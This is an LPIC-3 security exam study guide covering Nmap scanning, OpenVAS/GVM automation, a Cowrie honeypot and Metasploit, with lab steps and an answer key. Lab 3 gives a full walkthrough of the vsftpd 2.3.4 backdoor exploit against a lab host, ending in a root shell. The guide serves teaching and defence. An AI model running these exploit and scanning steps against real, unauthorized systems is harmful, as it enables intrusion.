# LPIC-3 Exam 303-300 (v3.0) — Topic 335 / 6.1: Threats and Vulnerability Assessment

**Exam Weight:** 5 (out of 30, approx. 16.66% of total exam score)  
**Target Certification:** LPIC-3 Security (303-300, Version 3.0)  
**Official Reference:** 
- [LPI LPIC-3 303 Certification Overview](https://www.lpi.org/our-certifications/lpic-3-303-overview/)
- [LPI Wiki LPIC-303 Objectives V3.0](https://wiki.lpi.org/wiki/LPIC-303_Objectives_V3.0)

---

## Technical Architecture & Core Concepts

Threat and vulnerability assessment in production Enterprise Linux environments requires a deep understanding of host-level vulnerabilities, network vector mechanics, automated security scanners, honeypot deception architectures, and structured penetration testing methodologies.

```
                  +-------------------------------------------------------------+
                  |               Active Reconnaissance & Scanning              |
                  |     (Nmap SYN/ACK/UDP, OS Fingerprinting, NSE Engine)     |
                  +------------------------------+------------------------------+
                                                 |
                                                 v
                  +-------------------------------------------------------------+
                  |            Vulnerability Management (OpenVAS / GVM)         |
                  |     (gvmd <-> ospd-openvas <-> openvas-scanner <-> NVTs)    |
                  +------------------------------+------------------------------+
                                                 |
                                                 v
                  +-------------------------------------------------------------+
                  |              Threat Vector & Exploit Analysis               |
                  |   (Metasploit MSF Engine, Privilege Escalation, Payloads)   |
                  +------------------------------+------------------------------+
                                                 |
                                                 v
                  +-------------------------------------------------------------+
                  |             Deception Technology & Telemetry                |
                  |        (Cowrie / Dionaea Honeypots, Syslog/SIEM Routing)    |
                  +-------------------------------------------------------------+
```

### 1. Network Reconnaissance & Low-Level Packet Mechanics (`nmap`)
`nmap` relies on manipulating TCP state transitions, ICMP control messages, and IP header flags to perform host discovery, port state determination, and OS fingerprinting.

* **TCP SYN Scan (`-sS`):** Known as half-open scanning. `nmap` transmits a raw TCP SYN packet to a target port.
  * If target responds with **SYN/ACK**: Port is `open`. `nmap` immediately sends an **RST** packet to tear down the socket before the 3-way handshake completes (evading simple application-layer loggers).
  * If target responds with **RST/ACK**: Port is `closed`.
  * If no response or ICMP unreachable (Type 3, Code 1, 2, 3, 9, 10, 13): Port is `filtered`.
* **TCP Connect Scan (`-sT`):** Uses the OS `connect()` system call. Completes the full TCP 3-way handshake (SYN $\rightarrow$ SYN/ACK $\rightarrow$ ACK) followed by an explicit `FIN` or `RST`. Used when raw socket permissions (`CAP_NET_RAW`) are unavailable.
* **TCP Stealth Scans (FIN `-sF`, NULL `-sN`, Xmas `-sX`):** Exploit RFC 793 TCP compliance.
  * Packets sent with specific flag combinations (Xmas sets `FIN`, `PSH`, `URG`).
  * RFC 793 states that closed ports must respond with `RST`, while open ports must silently drop the packet.
  * *Trade-off:* Stateless firewalls and non-RFC compliant operating systems (such as Windows) respond with `RST` regardless of port state, making these scans OS-dependent.
* **TCP ACK Scan (`-sA`):** Sets the `ACK` flag. Used exclusively to map firewall rule sets and differentiate between stateful and stateless packet filtering. Responses of `RST` indicate the port is unfiltered.
* **UDP Scan (`-sU`):** Sends raw UDP packets to target ports.
  * If an ICMP Port Unreachable (Type 3, Code 3) is returned, the port is `closed`.
  * If a UDP response is received, the port is `open`.
  * If no response is received after retries, the state is classified as `open|filtered`.
  * *Trade-off:* Rate limiting on ICMP error messages (e.g., Linux kernel limiting ICMP Type 3 responses to 1 per second) makes full-range UDP scanning extremely slow without `--min-rate`.

### 2. Vulnerability Assessment Engine Architecture (OpenVAS / GVM)
Greenbone Vulnerability Management (GVM) is an enterprise-grade vulnerability scanning suite.

* **Components & Daemon Communications:**
  * **`gvmd` (GVM Daemon):** The central management service. Implements Greenbone Management Protocol (GMP), controls tasks, handles authentication, and stores metadata in a PostgreSQL database.
  * **`ospd-openvas`:** Open Scanner Protocol Daemon. Acts as an abstraction layer bridging `gvmd` to `openvas-scanner` via standard OSP (XML over Unix Socket or TLS).
  * **`openvas-scanner`:** The raw execution engine. Loads Network Vulnerability Tests (NVTs) written in **NASL (Nessus Attack Scripting Language)**, executes scans against targeted hosts, and feeds results back to `ospd-openvas`.
  * **`gsa` (Greenbone Security Assistant):** Web interface serving HTTPS traffic on port 9392/TCP, communicating with `gvmd` via GMP.
* **NVTs & Feed Management:** Scanners rely on feed synchronization (`greenbone-nvt-sync`, `gvm-feed-update`) to fetch updated CVE vulnerabilities, OVAL definitions, and CERT advisories.

### 3. Penetration Testing Frameworks & Exploitation Mechanics (Metasploit)
Penetration testing follows structured lifecycle phases:
$$\text{Reconnaissance} \longrightarrow \text{Enumeration} \longrightarrow \text{Exploitation} \longrightarrow \text{Privilege Escalation} \longrightarrow \text{Persistence} \longrightarrow \text{Covering Tracks}$$

* **Metasploit Framework (`msfconsole`) Module Types:**
  * **Auxiliary:** Scanners, crawlers, fuzzers, and denial-of-service modules that do not return a shell.
  * **Exploit:** Code leveraging a specific software bug/vulnerability to execute code on target systems.
  * **Payload:** The code executed after a successful exploit. Categories:
    * *Singles:* Self-contained payloads (e.g., `linux/x64/shell_bind_tcp`).
    * *Stagers:* Small payloads that allocate memory, establish a network connection, and pull down a larger *Stage*.
    * *Stages:* Complex payloads providing rich interaction (e.g., `Meterpreter`).
  * **Post:** Modules executed after initial access to gather data, escalate privileges, or pivot through network segments.

---

## Guided Hands-On Lab Exercises

### Lab 1: Advanced Network Reconnaissance, Stealth Scanning, and Custom NSE Scripting with Nmap

In this lab, you will perform low-level packet manipulation using `nmap`, evaluate firewall response behaviors, run service versioning, and develop a custom Nmap Scripting Engine (NSE) Lua script to audit HTTP security headers.

#### Step 1: Execute Raw TCP SYN vs. TCP Connect Scans
Log into your Linux security workstation (`192.168.56.10`). Execute a TCP SYN scan and a TCP Connect scan against target node `192.168.56.20`, capturing packet timings and TCP state information.

```bash
# Execute raw SYN stealth scan with aggressive timing and OS/version detection
sudo nmap -sS -sV -O -p 22,80,443,3306 -T4 --packet-trace 192.168.56.20
```

**Expected Command Output:**
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:00 UTC
SENT (0.0410s) TCP 192.168.56.10:43210 > 192.168.56.20:22 S ttl=54 id=4123 seq=123456789 win=1024 <mss 1460>
RCVD (0.0418s) TCP 192.168.56.20:22 > 192.168.56.10:43210 SA ttl=64 id=0 seq=987654321 win=64240 <mss 1460>
SENT (0.0420s) TCP 192.168.56.10:43210 > 192.168.56.20:22 R ttl=54 id=4124 seq=123456790 win=0
Nmap scan report for 192.168.56.20
Host is up (0.00080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
443/tcp  closed https
3306/tcp filtered mysql
MAC Address: 08:00:27:A2:3B:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.4 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Now execute an ACK scan to inspect packet filtering capabilities on the target:

```bash
sudo nmap -sA -p 22,80,443,3306 192.168.56.20
```

**Expected Command Output:**
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:01 UTC
Nmap scan report for 192.168.56.20
Host is up (0.00075s latency).

PORT     STATE      SERVICE
22/tcp   unfiltered ssh
80/tcp   unfiltered http
443/tcp  unfiltered https
3306/tcp filtered   mysql

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

#### Step 2: Develop a Custom Lua Script for the Nmap Scripting Engine (NSE)
Create a syntactically valid custom NSE script designed to audit whether target HTTP services implement the `Strict-Transport-Security` (HSTS) header.

Write the following content to `/usr/share/nmap/scripts/http-hsts-check.nse`:

```lua
local http = require("http")
local shortport = require("shortport")
local stdnse = require("stdnse")

description = [[
Audits an HTTP/HTTPS service to verify the presence of the Strict-Transport-Security (HSTS) header.
]]

author = "Production SRE Architect"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

-- Rule section: trigger on HTTP/HTTPS ports
portrule = shortport.http

-- Action section: execution logic
action = function(host, port)
    local response = http.get(host, port, "/")
    
    if not response then
        return "ERROR: Failed to receive HTTP response."
    end

    local hsts = response.header["strict-transport-security"]

    if hsts then
        return string.format("[SECURE] HSTS Header found: %s", hsts)
    else
        return "[VULNERABLE] HSTS Header is MISSING! Risk of TLS Stripping."
    end
end
```

Update the NSE script database and execute your custom script:

```bash
sudo nmap --script-updatedb
nmap --script http-hsts-check.nse -p 80,443 192.168.56.20
```

**Expected Command Output:**
```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:05 UTC
Nmap scan report for 192.168.56.20
Host is up (0.00062s latency).

PORT    STATE  SERVICE
80/tcp  open   http
|_http-hsts-check: [VULNERABLE] HSTS Header is MISSING! Risk of TLS Stripping.
443/tcp open  https
|_http-hsts-check: [SECURE] HSTS Header found: max-age=31536000; includeSubDomains; preload

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

---

#### Verification Questions — Lab 1

1. **Why does a TCP ACK scan (`-sA`) report ports as `unfiltered` rather than `open` or `closed`?**
2. **In TCP SYN scanning (`-sS`), what specific packet sequence is emitted by Nmap upon receiving a `SYN/ACK` response from the target host, and what security objective does this achieve?**
3. **What is the structural difference between an NSE `portrule` defined with `shortport.http` and a `hostrule`?**

---

### Lab 2: Enterprise Vulnerability Scanning with OpenVAS / GVM Architecture & Automation

In this lab, you will configure, manage, and execute automated vulnerability scanning using the Greenbone Vulnerability Management (GVM) suite via command-line utilities (`gvm-cli`) and verify NVT feed synchronization.

#### Step 1: Verify GVM Daemon Architecture and Feed State
Check the running services of the GVM stack and check the status of the Network Vulnerability Tests (NVT) database.

```bash
# Check status of gvmd, ospd-openvas, and postgresql
systemctl status gvmd ospd-openvas postgresql --no-pager
```

**Expected Command Output:**
```text
● gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)
     Loaded: loaded (/lib/systemd/system/gvmd.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-08-06 10:00:12 UTC; 4h 0min ago
       Docs: man:gvmd(8)
   Main PID: 1204 (gvmd)
      Tasks: 1 (limit: 4681)
     Memory: 45.2M
        CPU: 1.234s
     CGroup: /system.slice/gvmd.service
             └─1204 gvmd: Waiting for incoming connections

● ospd-openvas.service - OSPD OpenVAS Scanner Daemon
     Loaded: loaded (/lib/systemd/system/ospd-openvas.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-08-06 10:00:15 UTC; 4h 0min ago
   Main PID: 1245 (python3)
```

Verify current NVT database status using `gvmd`:

```bash
sudo -u gvm gvmd --get-scanners
sudo -u gvm gvmd --get-users
```

**Expected Command Output:**
```text
08b69003-5fc2-4037-a479-93b440211c73  OpenVAS Default  /var/run/ospd/ospd-openvas.sock  0  OpenVAS Scanner
admin
```

#### Step 2: Automate Vulnerability Scan Task Creation via `gvm-cli`
Use `gvm-cli` over Unix Socket to generate a target, create a scan task, and initiate execution against `192.168.56.20`.

```bash
# Generate GMP XML payload to create a scan target
gvm-cli --gmp-username admin --gmp-password "SecurePass123!" socket --xml \
  '<create_target><name>Production Web Cluster</name><hosts>192.168.56.20</hosts><port_list id="4a471842-3567-11e3-a417-406186ea4fc5"/></create_target>'
```

**Expected Command Output:**
```xml
<create_target_response status="201" status_text="OK, resource created" id="e7b1a2c3-d4e5-6789-0123-456789abcdef"/>
```

Next, create the scan task using the Full and Fast scan config UUID (`daba56c8-73ec-11df-a475-002264764cea`) and target ID created above:

```bash
gvm-cli --gmp-username admin --gmp-password "SecurePass123!" socket --xml \
  '<create_task><name>Audit Web 192.168.56.20</name><config id="daba56c8-73ec-11df-a475-002264764cea"/><target id="e7b1a2c3-d4e5-6789-0123-456789abcdef"/><scanner id="08b69003-5fc2-4037-a479-93b440211c73"/></create_task>'
```

**Expected Command Output:**
```xml
<create_task_response status="201" status_text="OK, resource created" id="a1b2c3d4-e5f6-7890-1234-567890abcdef"/>
```

Start the created scan task:

```bash
gvm-cli --gmp-username admin --gmp-password "SecurePass123!" socket --xml \
  '<start_task task_id="a1b2c3d4-e5f6-7890-1234-567890abcdef"/>'
```

**Expected Command Output:**
```xml
<start_task_response status="202" status_text="OK, request submitted">
  <report_id>f9e8d7c6-b5a4-3210-0987-654321fedcba</report_id>
</start_task_response>
```

---

#### Verification Questions — Lab 2

1. **In the OpenVAS / GVM architecture, what is the exact role of `ospd-openvas`, and how does it interface between `gvmd` and `openvas-scanner`?**
2. **What programming language is used to write Network Vulnerability Tests (NVTs) executed by `openvas-scanner`?**

---

### Lab 3: Penetration Testing Workflow & Metasploit Framework Integration

In this lab, you will execute a structured penetration testing exercise utilizing `msfconsole`. You will import reconnaissance data, execute a vulnerable service check, set up an exploit with a specific payload, and inspect session metrics.

> **Legal & Ethical Notice:** Penetration testing must ONLY be conducted on networks and hosts where you possess explicit, written authorization (Rules of Engagement). Unauthorized testing is illegal under computer misuse laws worldwide.

#### Step 1: Initialize Database and Import Nmap Recon Data into Metasploit
Start the PostgreSQL database for Metasploit, launch `msfconsole`, and import Nmap XML scan results.

```bash
sudo systemctl start postgresql
msfconsole -q -x "db_status; db_nmap -sV 192.168.56.20; hosts; services"
```

**Expected Command Output:**
```text
[*] Connected to PostgreSQL database name msf_db. Connection type: Connected.
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-06 14:15 UTC
[*] Nmap: Nmap scan report for 192.168.56.20
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     vsftpd 2.3.4
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.41

Hosts
=====
address        mac                os_name  os_flavor  os_sp  purpose  state  name
-------        ---                -------  ---------  -----  -------  -----  ----
192.168.56.20  08:00:27:A2:3B:11  Linux                       server   alive

Services
========
host           port  proto  name  state  info
----           ----  -----  ----  -----  ----
192.168.56.20  21    tcp    ftp   open   vsftpd 2.3.4
192.168.56.20  80    tcp    http  open   Apache httpd 2.4.41
```

#### Step 2: Configure Exploit and Payload Modules
Select the `vsftpd_234_backdoor` exploit module, configure target parameters, select an explicit payload, and verify module options.

```bash
msfconsole -q
```

Within the interactive shell, execute the following commands:

```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.20
RHOSTS => 192.168.56.20
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set CHOST 192.168.56.10
CHOST => 192.168.56.10
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

**Expected Command Output:**
```text
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.56.20    yes       Target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Execute the exploit and interact with the resulting session:

```text
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.20:21 - USER name smiley:)
[+] 192.168.56.20:21 - Backdoor service spawned on port 6200.
[*] Command shell session 1 opened (192.168.56.10:44123 -> 192.168.56.20:6200) at 2026-08-06 14:20:11 +0000

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[*] Starting interaction with 1.

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux target-node 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 GNU/Linux
```

---

#### Verification Questions — Lab 3

1. **What is the fundamental architectural difference between an Metasploit *Auxiliary* module and an *Exploit* module?**
2. **What is the difference between a *Staged* payload and a *Stageless (Single)* payload in Metasploit, and what network trade-off exists between them when traversing strict egress firewalls?**

---

### Lab 4: Threat Simulation, Deception Technology & Honeypot Analytics (Cowrie)

In this lab, you will configure and deploy an SSH/Telnet low/medium-interaction honeypot (**Cowrie**), simulate an attacker credential brute-force attempt, and analyze structured JSON telemetry logs.

#### Step 1: Configure Cowrie Honeypot Instance
Create a syntactically valid configuration file for Cowrie at `/etc/cowrie/cowrie.cfg` to emulate a Linux server running OpenSSH.

```ini
[honeypot]
hostname = prod-db-01.internal.net
log_path = var/log/cowrie
download_path = var/lib/cowrie/downloads

[shell]
filesystem = share/cowrie/fs.pickle
arch = x86_64
kernel_version = 5.15.0-91-generic
kernel_build = #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023

[ssh]
enabled = true
listen_endpoints = tcp:2222:interface=0.0.0.0
version = SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6

[telnet]
enabled = false
```

Start the Cowrie honeypot daemon:

```bash
sudo -u cowrie /opt/cowrie/bin/cowrie start
sudo -u cowrie /opt/cowrie/bin/cowrie status
```

**Expected Command Output:**
```text
Activating virtualenv "/opt/cowrie/cowrie-env"
Cowrie is running as Process ID 14201.
```

#### Step 2: Simulate External Attack & Analyze JSON Telemetry
From your attacker workstation (`192.168.56.10`), initiate an unauthorized SSH login attempt to the honeypot port (`2222`):

```bash
ssh -p 2222 root@192.168.56.20
```

*Enter dummy password:* `admin123`

```text
root@192.168.56.20's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

root@prod-db-01:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
root@prod-db-01:~# exit
logout
Connection to 192.168.56.20 closed.
```

Now, query Cowrie's structured log file `/var/log/cowrie/cowrie.json` using `jq` to extract the session event sequence, credentials tried, and commands executed by the attacker:

```bash
cat /var/log/cowrie/cowrie.json | jq -r '{timestamp: .timestamp, src_ip: .src_ip, eventid: .eventid, username: .username, password: .password, input: .input}' | grep -v 'null'
```

**Expected Command Output:**
```json
{
  "timestamp": "2026-08-06T14:35:10.123456Z",
  "src_ip": "192.168.56.10",
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "admin123"
}
{
  "timestamp": "2026-08-06T14:35:18.654321Z",
  "src_ip": "192.168.56.10",
  "eventid": "cowrie.command.input",
  "input": "cat /etc/passwd"
}
{
  "timestamp": "2026-08-06T14:35:22.987654Z",
  "src_ip": "192.168.56.10",
  "eventid": "cowrie.session.closed"
}
```

---

#### Verification Questions — Lab 4

1. **What is the classification difference between a *Low-Interaction Honeypot* (e.g., Cowrie) and a *High-Interaction Honeypot* (e.g., a dedicated VM with real Linux kernel and physical network bridge), and what are the security trade-offs of each?**
2. **How does deploying a deception control (honeypot/canary) in an enterprise network reduce false-positive rates for Security Information and Event Management (SIEM) alerts?**

---

<details>
<summary>Exercise Answers & Verification Key</summary>

### Answers for Lab 1 Verification Questions

1. **Why does a TCP ACK scan (`-sA`) report ports as `unfiltered` rather than `open` or `closed`?**  
   *Answer:* A TCP ACK scan sends packets with only the `ACK` flag set. According to TCP state specification (RFC 793), any active host receiving an unsolicited `ACK` packet will respond with an `RST` packet, regardless of whether the target port is `open` or `closed`. Thus, receiving an `RST` only proves that the packet traversed stateful firewalls/filters and reached the host (`unfiltered`). If no response is received, or an ICMP error (Type 3) occurs, Nmap marks the port as `filtered`.

2. **In TCP SYN scanning (`-sS`), what specific packet sequence is emitted by Nmap upon receiving a `SYN/ACK` response from the target host, and what security objective does this achieve?**  
   *Answer:* Nmap immediately transmits a `RST` (Reset) packet. This tears down the embryonic TCP connection before the full 3-way handshake completes. Because the TCP socket is never fully established, the application layer (e.g., Apache, Nginx, OpenSSH) is not notified of an incoming socket connection, avoiding log creation in traditional application-level connection logs.

3. **What is the structural difference between an NSE `portrule` defined with `shortport.http` and a `hostrule`?**  
   *Answer:* A `portrule` evaluates per-port criteria (e.g., checking if the port is open and running an HTTP service) and executes the Lua `action` function once per matching port on a target host. A `hostrule` evaluates host-level conditions (e.g., target IP subnets, routing table characteristics, ICMP responsiveness) and executes the `action` function once per target host, regardless of open ports.

---

### Answers for Lab 2 Verification Questions

1. **In the OpenVAS / GVM architecture, what is the exact role of `ospd-openvas`, and how does it interface between `gvmd` and `openvas-scanner`?**  
   *Answer:* `ospd-openvas` is an implementation of the Open Scanner Protocol (OSP) daemon. It acts as an intermediary communication daemon between the high-level manager (`gvmd`) and the low-level scanner (`openvas-scanner`). `gvmd` sends scan commands over a Unix socket/TLS using standard OSP XML requests to `ospd-openvas`, which translates these directives, spawns and controls `openvas-scanner` processes, and returns scan progress and results back to `gvmd`.

2. **What programming language is used to write Network Vulnerability Tests (NVTs) executed by `openvas-scanner`?**  
   *Answer:* NVTs are written in **NASL** (Nessus Attack Scripting Language), a specialized scripting language designed to construct custom network packets, inspect protocol payloads, parse version strings, and verify vulnerabilities safely.

---

### Answers for Lab 3 Verification Questions

1. **What is the fundamental architectural difference between a Metasploit *Auxiliary* module and an *Exploit* module?**  
   *Answer:* An *Auxiliary* module performs action sequences such as network discovery, service fingerprinting, credential brute-forcing, or Denial of Service (DoS) without injecting code or establishing a remote shell payload. An *Exploit* module actively leverages a software flaw/vulnerability to execute arbitrary code on the remote target and deliver a *Payload* (such as a reverse shell or Meterpreter session).

2. **What is the difference between a *Staged* payload and a *Stageless (Single)* payload in Metasploit, and what network trade-off exists between them when traversing strict egress firewalls?**  
   *Answer:* 
   * *Staged payloads* (e.g., `linux/x64/meterpreter/reverse_tcp`) use a tiny initial stub payload (Stage 0) injected into the target process. This stub connects back to the attacker handler to fetch the larger binary payload (Stage 1) into memory. *Trade-off:* Staged payloads have a very small initial exploit memory footprint, but require multiple network transmissions that can be detected or blocked by egress filtering / deep packet inspection (DPI).
   * *Stageless (Single) payloads* (e.g., `linux/x64/meterpreter_reverse_tcp`) contain the entire shell code in a single executable blob. *Trade-off:* They are larger in memory footprint, but execute completely in a single shot without needing to fetch additional code across the network, making them more resilient against multi-stage network blocking.

---

### Answers for Lab 4 Verification Questions

1. **What is the classification difference between a *Low-Interaction Honeypot* (e.g., Cowrie) and a *High-Interaction Honeypot*, and what are the security trade-offs of each?**  
   *Answer:* 
   * *Low/Medium-Interaction Honeypots* (like Cowrie) emulate specific services, shells, and operating system responses using fake software abstractions without exposing a real kernel. *Trade-offs:* Extremely safe, low resource usage, zero risk of the host being compromised and used to attack third parties; however, sophisticated attackers can quickly identify the emulation limitations.
   * *High-Interaction Honeypots* use actual operating systems, real applications, and full virtual machines. *Trade-offs:* Captures complete zero-day exploits, rootkits, and real attacker behaviors; however, they require complex isolation sandboxing and pose a high risk: if compromised, an attacker might break containment and use the node to launch lateral attacks.

2. **How does deploying a deception control (honeypot/canary) in an enterprise network reduce false-positive rates for Security Information and Event Management (SIEM) alerts?**  
   *Answer:* Honeypots carry no legitimate operational traffic, no production users, and no authorized service-to-service communications. Therefore, **any interaction** (TCP connection attempt, ping, authentication request) hitting a honeypot address is inherently unauthorized or malicious. SIEM alert rules triggering on honeypot activity operate near a zero false-positive rate, enabling immediate automated containment responses.

</details>